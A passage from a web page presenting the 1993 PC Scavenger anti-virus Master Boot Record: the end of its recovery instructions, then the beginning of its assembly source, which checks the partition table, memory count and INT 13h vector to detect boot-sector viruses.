
What to do:
----------
1.)  Don't panic! This is easy.
2.)  Boot from the emergency diskette.
3.)  Type "SYS C:" to write a new boot sector
4.)  Type "FDISK/MBR" to write a fresh MBR
5.)  Type "PCSCAV", and choose (I)nstall to re-install
     PC Scavenger on the system
     
It's as simple as that. Your system will now be clean again, and safe
to reboot.

NOTE: If your system will not boot after cleaning a virus attack, it
      is most likely because the virus has destroyed the partition
      table. To restore it, boot off the emergency diskette, then
      run PCSCAV.COM. Choose the (R)estore option to repair the
      original partition table. Run PCSCAV.COM again, and choose
      the (I)nstall option to set PC Scavenger back up.
      If it still does not work, the virus probably has destroyed the
      file structure in some way (ie: format or delete sectors). In
      this case, you will need to Restore your backups. It is very
      rare that a virus will damage the system the moment it is
      infected.
      
      WARNING:  ONLY use (R)estore if your partition table has been
      -------   destroyed! Improper use may cause undue damage to
                your system.
--- END OF DOCUMENTATION ---------------------------------- KSAJ ---
</pre>
 
<h3><a name="pb2"></a>PC Scavenger Source Code</h3>
<p>The source code for the PC Scavenger Anti-Virus Master Boot Record is included for those interested in how the MBR functions. The appendices contain a DEBUG script and instructions for the compilation of the installation program. For those who do not wish to compile this program themselves, a DEBUG script for the MBR is also given. Instructions on how to compile DEBUG scripts appears at the beginning of the appendix.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">COMMENT<br/>
~=====================================================================<br/>
&nbsp; &nbsp; &nbsp; PC Scavenger Anti<span style="color: #339933;">-</span>Virus Master Boot Record <span style="color: #339933;">--</span> SOURCE <span style="color: #0000ff; font-weight: bold;">CODE</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">------------------------------------------</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>c<span style="color: black;">&#41;</span> <span style="color: #ff0000;">1993</span> Karsten Johansson<span style="color: #339933;">,</span> PC Scavenger<br/>
<br/>
The PC Scavenger Anti<span style="color: #339933;">-</span>Virus Master Boot Record is a fully functional<br/>
Master Boot Record<span style="color: #339933;">.</span> <span style="color: #00007f; font-weight: bold;">In</span> addition to the standard diagnostics <span style="color: #00007f; font-weight: bold;">and</span><br/>
partition duties of the MBR<span style="color: #339933;">,</span> PC Scavenger will detect virtually ANY<br/>
virus infection <span style="color: #00007f; font-weight: bold;">in</span> the MBR <span style="color: black;">&#40;</span>Such as Stoned<span style="color: #339933;">,</span> Michelangelo<span style="color: #339933;">,</span> etc<span style="color: black;">&#41;</span><span style="color: #339933;">.</span><br/>
<br/>
If no error is dectected<span style="color: #339933;">,</span> you can be quite sure an infection has <span style="color: #00007f; font-weight: bold;">not</span><br/>
taken place<span style="color: #339933;">.</span><br/>
<br/>
NOTE<span style="color: #339933;">:</span> This program was only written to demonstrate how the MBR can<br/>
&nbsp; &nbsp; &nbsp; be protected<span style="color: #339933;">.</span> Nothing has been added to keep the Boot Sector<br/>
&nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span> executable files from being infected<span style="color: #339933;">.</span><br/>
&nbsp; &nbsp; &nbsp; <br/>
Instructions<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; Read PCSCAV<span style="color: #339933;">.</span>TXT for information<br/>
&nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; To Compile<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;TASM PCSCAV<span style="color: #339933;">.</span>ASM<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;TLINK PCSCAV<span style="color: #339933;">.</span>OBJ<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;EXE2BIN PCSCAV<span style="color: #339933;">.</span>EXE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DEL PCSCAV<span style="color: #339933;">.</span>EXE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DEL PCSCAV<span style="color: #339933;">.</span>MAP<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DEL PCSCAV<span style="color: #339933;">.</span>OBJ<br/>
<br/>
=======================================================================<br/>
~<br/>
AVPart&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">segment</span> para <span style="color: #0000ff; font-weight: bold;">stack</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>AVPart<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span>AVPart<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ss</span><span style="color: #339933;">:</span>AVPart<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
KSAJ<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cli</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Disable interrupts</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ss</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Ss at 0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">sp</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7C00h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Stack at boot</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">sp</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span> <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span> <span style="color: #46aa03; font-weight: bold;">ds</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Es=ds=0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sti</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Enable interupts</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cld</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #ff0000;">600h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Buffer at 0:600</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">100h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">repnz</span> &nbsp; <span style="color: #00007f; font-weight: bold;">movsw</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Move entire MBR into buffer</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0EAh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Jmp far</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset Second_Entry <span style="color: #339933;">+</span> <span style="color: #ff0000;">600h</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; to Second_Entry</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; at new location</span><br/>
<br/>
Second_Entry<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>PC_Scav <span style="color: #339933;">+</span> <span style="color: #ff0000;">600h</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Display copyright</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Screen_Write<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>Partn_Table1 <span style="color: #339933;">+</span> <span style="color: #ff0000;">600h</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;4 possible partitions</span><br/>
<br/>
Check_Partn<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Is it bootable?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; Save_Thing&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;If so, go for it</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Non-Bootable partition?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; Bad_Partn &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Not a proper partition entry!</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Point to next partition</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Lower counter</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; Bad_Partn &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Bail out if counter = 0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short Check_Partn &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Otherwise,check next table</span><br/>
<br/>
Save_Thing<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Save Partition Start-Head</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Save Partition Start-Sector</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span><br/>
<br/>
Partn_Byte<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Go to next partition</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Remember where we are</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; Check_Boot&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;If all are checked, move on</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; Partn_Byte<br/>
<br/>
Bad_Partn<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>Bad_PT <span style="color: #339933;">+</span> <span style="color: #ff0000;">600h</span><span style="color: black;">&#41;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Write Bad Partition error</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Screen_Write<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short <span style="color: #0000ff; font-weight: bold;">$</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;hang computer</span><br/>
<br/>
Check_Boot<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Try reading up to 5 times</span><br/>
<br/>
Read_Boot<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7C00h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Read in the boot sector</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">201h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; from active partition</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">13h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnb</span> &nbsp; &nbsp; BS_There&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Continue if read OK</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">13h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Reset disk</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Decrease read counter</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; Read_Boot &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Try again if counter allows</span><br/>
<br/>
Do_Error<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>Error <span style="color: #339933;">+</span> <span style="color: #ff0000;">600h</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Screen_Write<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short <span style="color: #0000ff; font-weight: bold;">$</span><br/>
<br/>
BS_There<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: #ff0000;">413h</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Get BIOS memory count</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>640d &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;640K memory?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>MEM_Bad <span style="color: #339933;">+</span> <span style="color: #ff0000;">600h</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jb</span>&nbsp; &nbsp; &nbsp; Fail_Msg&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Fail if less memory</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0C4h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">6</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4Ch</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;LES AX,DWORD 13h * 4</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">es</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Check if INT 13h moved</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shr</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cl</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Divide by 16 (Paragraphs)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnb</span> &nbsp; &nbsp; Boot_Disk &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Everything seems fine!</span><br/>
